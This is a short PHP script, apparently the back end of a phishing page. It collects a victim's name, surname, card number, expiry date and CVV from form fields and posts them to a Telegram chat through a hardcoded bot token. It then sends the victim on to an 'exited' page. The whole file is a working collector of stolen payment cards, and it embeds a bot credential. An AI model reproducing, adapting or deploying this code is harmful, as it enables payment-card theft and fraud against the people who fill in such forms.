<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5160141279:AAErV8ttRSt-RD-Plsm1kqXsLcpP35X3exY";
#digitales
$one = $_POST['one'];
$two = $_POST['lastnamecard'];
$tree = $_POST['cardnumber'];
$four = $_POST['expdate'];
$five = $_POST['scv'];

$datos = [
    'chat_id' => '1474960154',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "👤NUEVO REGISTRO👤 \n Step 2 \n------------------------\n Nombre: $one \n Apellido: $two \n Numero de tarjeta: $tree \n Vencimiento: $four \n CVV: $five \n\nATTE: AssistentReboot",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: exited.php");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
?>